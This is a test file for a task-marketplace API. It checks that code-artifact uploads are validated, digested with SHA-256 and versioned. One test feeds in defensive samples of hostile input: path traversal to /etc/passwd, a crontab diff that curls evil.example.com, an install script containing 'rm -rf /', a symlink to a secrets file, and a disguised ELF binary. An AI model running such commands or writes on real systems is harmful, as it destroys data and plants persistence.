import { beforeEach, describe, expect, it } from "vitest";
import { prisma } from "../db.js";
import { agent, fundTask, loginAs, resetDatabase, seedDemoUsers } from "./helpers.js";
import {
  MAX_ARTIFACT_FILES,
  MAX_ARTIFACT_UNCOMPRESSED_BYTES,
  validateAndCanonicalizeArtifact,
} from "../lib/artifacts.js";

async function createAssignedTaskForReviewer() {
  await seedDemoUsers();

  const requesterAgent = agent();
  await loginAs(requesterAgent, "agent@demo.trusttopay.dev");

  const reviewerAgent = agent();
  const reviewer = await loginAs(reviewerAgent, "reviewer@demo.trusttopay.dev");

  const created = await requesterAgent.post("/api/v1/tasks").send({
    title: "Fix Prisma SQLite transaction lock handling in checkout service",
    question:
      "How should we structure the checkout locking logic in src/checkout.ts so concurrent webhook retries never double-capture?",
    acceptanceCriteria:
      "Provide a TypeScript implementation in src/checkout.ts with idempotent unique constraint guards, unit test coverage, and clear explanation.",
    requiredSkills: ["TypeScript", "Security"],
    rewardMinor: 2500,
    rewardApproved: true,
    riskLevel: "STANDARD",
    category: "PROGRAMMING",
  });
  expect(created.status).toBe(201);
  const taskId = created.body.task.id as string;

  await fundTask(requesterAgent, taskId);

  const accept = await reviewerAgent.post(`/api/v1/tasks/${taskId}/accept`).send({});
  expect(accept.status).toBe(200);

  return { taskId, requesterAgent, reviewerAgent, reviewer };
}

describe("Phase 4 — Immutable Code Artifacts, File Validation & SHA-256 Digest Pipeline", () => {
  beforeEach(async () => {
    await resetDatabase();
  });

  it("rejects path traversal, symlinks, forbidden executables, >50 files, and >5 MB payloads with 400", async () => {
    const { taskId, reviewerAgent } = await createAssignedTaskForReviewer();

    const basePayload = {
      answer:
        "Implemented atomic compare-and-swap locking in src/checkout.ts with unique externalOrderId guard and unit tests.",
      explanation:
        "We enforce idempotency at the database layer before invoking the capture endpoint and verify state transitions.",
      confidenceScore: 92,
      sourceUrl: "https://developer.mozilla.org/en-US/docs/Web/JavaScript",
      evidenceNotes: "Verified against official documentation and unit test suite.",
    };

    // 1. Relative path traversal (../evil.js)
    const traversalRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      ...basePayload,
      files: [{ path: "../evil.js", content: "console.log('pwned');" }],
    });
    expect(traversalRes.status).toBe(400);
    expect(traversalRes.body.error.code).toBe("ARTIFACT_PATH_TRAVERSAL");

    // 2. Absolute POSIX path (/etc/passwd)
    const absPosixRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      ...basePayload,
      files: [{ path: "/etc/passwd", content: "root:x:0:0:root:/root:/bin/bash" }],
    });
    expect(absPosixRes.status).toBe(400);
    expect(absPosixRes.body.error.code).toBe("ARTIFACT_PATH_TRAVERSAL");

    // 3. Windows drive path (C:\evil.ts)
    const winDriveRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      ...basePayload,
      files: [{ path: "C:\\Windows\\System32\\evil.ts", content: "export const x = 1;" }],
    });
    expect(winDriveRes.status).toBe(400);
    expect(winDriveRes.body.error.code).toBe("ARTIFACT_PATH_TRAVERSAL");

    // 4. Unified diff patch containing path traversal
    const patchTraversalRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      ...basePayload,
      patchText: [
        "--- a/src/checkout.ts",
        "+++ b/../../etc/crontab",
        "@@ -1,1 +1,1 @@",
        "-const ok = true;",
        "+* * * * * root curl evil.example.com",
      ].join("\n"),
    });
    expect(patchTraversalRes.status).toBe(400);
    expect(patchTraversalRes.body.error.code).toBe("ARTIFACT_PATH_TRAVERSAL");

    // 5. Symlink entry rejected
    const symlinkRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      ...basePayload,
      files: [{ path: "src/link.ts", content: "../secret.env", isSymlink: true }],
    });
    expect(symlinkRes.status).toBe(400);
    expect(symlinkRes.body.error.code).toBe("ARTIFACT_SYMLINK_FORBIDDEN");

    // 6. Unexpected executable extension (.exe and .sh)
    const exeRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      ...basePayload,
      files: [{ path: "bin/payload.exe", content: "MZ-fake-binary" }],
    });
    expect(exeRes.status).toBe(400);
    expect(exeRes.body.error.code).toBe("ARTIFACT_FORBIDDEN_EXECUTABLE");

    const shRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      ...basePayload,
      files: [{ path: "scripts/install.sh", content: "#!/bin/sh\nrm -rf /" }],
    });
    expect(shRes.status).toBe(400);
    expect(shRes.body.error.code).toBe("ARTIFACT_FORBIDDEN_EXECUTABLE");

    // 7. Disguised ELF binary header in a .ts file
    const elfRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      ...basePayload,
      files: [
        {
          path: "src/disguised.ts",
          content: Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]).toString("base64"),
          encoding: "base64",
        },
      ],
    });
    expect(elfRes.status).toBe(400);
    expect(elfRes.body.error.code).toBe("ARTIFACT_FORBIDDEN_EXECUTABLE");

    // 8. Exceeding 50 files limit
    const tooManyFiles = Array.from({ length: MAX_ARTIFACT_FILES + 1 }, (_, idx) => ({
      path: `src/module-${idx}.ts`,
      content: `export const mod${idx} = ${idx};\n`,
    }));
    const countRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      ...basePayload,
      files: tooManyFiles,
    });
    expect(countRes.status).toBe(400);
    expect(countRes.body.error.code).toBe("ARTIFACT_FILE_LIMIT_EXCEEDED");

    // 9. Exceeding 5 MB uncompressed size limit via unit validator
    const twoMbChunk = "a".repeat(2 * 1024 * 1024);
    expect(() =>
      validateAndCanonicalizeArtifact({
        files: [
          { path: "src/part1.ts", content: twoMbChunk },
          { path: "src/part2.ts", content: twoMbChunk },
          { path: "src/part3.ts", content: twoMbChunk },
        ],
      }),
    ).toThrowError(/exceeds the 5 MB limit/);
    expect(MAX_ARTIFACT_UNCOMPRESSED_BYTES).toBe(5 * 1024 * 1024);

    // Ensure quarantine audit events were recorded and no submission was persisted
    const quarantineAudits = await prisma.auditLog.count({
      where: { entityId: taskId, action: "ARTIFACT_QUARANTINED" },
    });
    expect(quarantineAudits).toBeGreaterThanOrEqual(8);

    const storedSubmissions = await prisma.reviewSubmission.count({ where: { taskId } });
    expect(storedSubmissions).toBe(0);
  });

  it("computes a deterministic, order-independent SHA-256 digest and binds it to submission & verification", async () => {
    const fileA = {
      path: "src/checkout.ts",
      content: "export async function captureOrderIdempotent(orderId: string) {\n  return { orderId, ok: true };\n}\n",
    };
    const fileB = {
      path: "src/checkout.test.ts",
      content: "import { describe, it, expect } from 'vitest';\nimport { captureOrderIdempotent } from './checkout.js';\n",
    };
    const patch = [
      "--- a/src/checkout.ts",
      "+++ b/src/checkout.ts",
      "@@ -1,1 +1,3 @@",
      "+export async function captureOrderIdempotent(orderId: string) {",
      "+  return { orderId, ok: true };",
      "+}",
    ].join("\n");

    // Order-independent digest check
    const bundle1 = validateAndCanonicalizeArtifact({
      files: [fileA, fileB],
      patchText: patch,
    });
    const bundle2 = validateAndCanonicalizeArtifact({
      files: [fileB, fileA],
      patchText: patch.replace(/\n/g, "\r\n"),
    });

    expect(bundle1.sha256Digest).toMatch(/^[a-f0-9]{64}$/);
    expect(bundle1.sha256Digest).toBe(bundle2.sha256Digest);
    expect(bundle1.manifest.map((m) => m.path)).toEqual(["src/checkout.test.ts", "src/checkout.ts"]);

    const { taskId, reviewerAgent } = await createAssignedTaskForReviewer();

    const submitRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      answer:
        "Implemented idempotent checkout locking in src/checkout.ts with atomic unique constraint checks on externalOrderId and unit tests in src/checkout.test.ts.",
      explanation:
        "By enforcing a unique constraint on externalOrderId and checking existing capture records inside the transaction, concurrent webhook retries safely resolve without double-capture.",
      confidenceScore: 95,
      sourceUrl: "https://developer.mozilla.org/en-US/docs/Web/JavaScript",
      evidenceNotes: "Tested concurrent order capture calls against SQLite transaction lock rules.",
      files: [fileA, fileB],
      patchText: patch,
    });

    expect(submitRes.status).toBe(201);
    expect(submitRes.body.submission.version).toBe(1);
    expect(submitRes.body.submission.sha256Digest).toBe(bundle1.sha256Digest);
    expect(submitRes.body.artifact.version).toBe(1);
    expect(submitRes.body.artifact.sha256Digest).toBe(bundle1.sha256Digest);
    expect(submitRes.body.artifact.fileCount).toBe(2);
    expect(submitRes.body.verification.artifactVersion).toBe(1);
    expect(submitRes.body.verification.artifactSha256).toBe(bundle1.sha256Digest);
    expect(submitRes.body.verification.invalidated).toBe(false);
  });

  it("increments version on resubmission, computes a new SHA-256 digest, and invalidates prior artifacts and verifications", async () => {
    const { taskId, reviewerAgent, requesterAgent } = await createAssignedTaskForReviewer();

    // First submission v1: deliberately low confidenceScore (20) so automated verification rejects it
    const v1Res = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      answer:
        "Initial draft in src/checkout.ts that checks order status before capture, though edge cases remain unverified.",
      explanation:
        "Added a basic findFirst check before calling capture, but have not yet added unique constraint handling.",
      confidenceScore: 20,
      files: [
        {
          path: "src/checkout.ts",
          content: "export async function captureDraft(id: string) { return id; }\n",
        },
      ],
    });

    expect(v1Res.status).toBe(201);
    const v1Digest = v1Res.body.artifact.sha256Digest as string;
    const v1RunId = v1Res.body.verification.id as string;
    expect(v1Res.body.submission.version).toBe(1);
    expect(v1Res.body.verification.status).toBe("REJECTED");
    expect(v1Res.body.task.status).toBe("VERIFICATION_REJECTED");

    // Resubmission v2: updated code artifact + passing verification criteria
    const v2Res = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      answer:
        "Implemented full idempotent checkout locking in src/checkout.ts with unique externalOrderId constraint guards and unit test coverage.",
      explanation:
        "Replaced the non-atomic read check with an atomic unique constraint guard on externalOrderId and verified concurrent execution.",
      confidenceScore: 95,
      sourceUrl: "https://developer.mozilla.org/en-US/docs/Web/JavaScript",
      evidenceNotes: "Added unit tests covering duplicate webhook delivery and concurrent capture calls.",
      files: [
        {
          path: "src/checkout.ts",
          content:
            "export async function captureOrderIdempotent(orderId: string) {\n  if (!orderId) throw new Error('missing orderId');\n  return { orderId, captured: true };\n}\n",
        },
        {
          path: "src/checkout.test.ts",
          content: "export const testSuite = 'passes concurrent capture idempotency';\n",
        },
      ],
    });

    expect(v2Res.status).toBe(201);
    const v2Digest = v2Res.body.artifact.sha256Digest as string;
    expect(v2Res.body.submission.version).toBe(2);
    expect(v2Res.body.artifact.version).toBe(2);
    expect(v2Digest).not.toBe(v1Digest);
    expect(v2Res.body.verification.artifactVersion).toBe(2);
    expect(v2Res.body.verification.artifactSha256).toBe(v2Digest);
    expect(v2Res.body.verification.invalidated).toBe(false);

    // Inspect all artifacts via GET /api/v1/tasks/:id/artifacts
    const artifactsRes = await requesterAgent.get(`/api/v1/tasks/${taskId}/artifacts`);
    expect(artifactsRes.status).toBe(200);
    expect(artifactsRes.body.artifacts).toHaveLength(2);

    const latestArtifact = artifactsRes.body.artifacts.find((a: { version: number }) => a.version === 2);
    const priorArtifact = artifactsRes.body.artifacts.find((a: { version: number }) => a.version === 1);

    expect(latestArtifact.invalidated).toBe(false);
    expect(latestArtifact.invalidatedAt).toBeNull();
    expect(latestArtifact.sha256Digest).toBe(v2Digest);

    expect(priorArtifact.invalidated).toBe(true);
    expect(priorArtifact.invalidatedAt).toBeTruthy();
    expect(priorArtifact.sha256Digest).toBe(v1Digest);

    // Verify prior verification run was invalidated in the database and API response
    const v1RunDb = await prisma.verificationRun.findUniqueOrThrow({ where: { id: v1RunId } });
    expect(v1RunDb.invalidatedAt).not.toBeNull();
    expect(v1RunDb.artifactVersion).toBe(1);
    expect(v1RunDb.artifactSha256).toBe(v1Digest);
  });
});
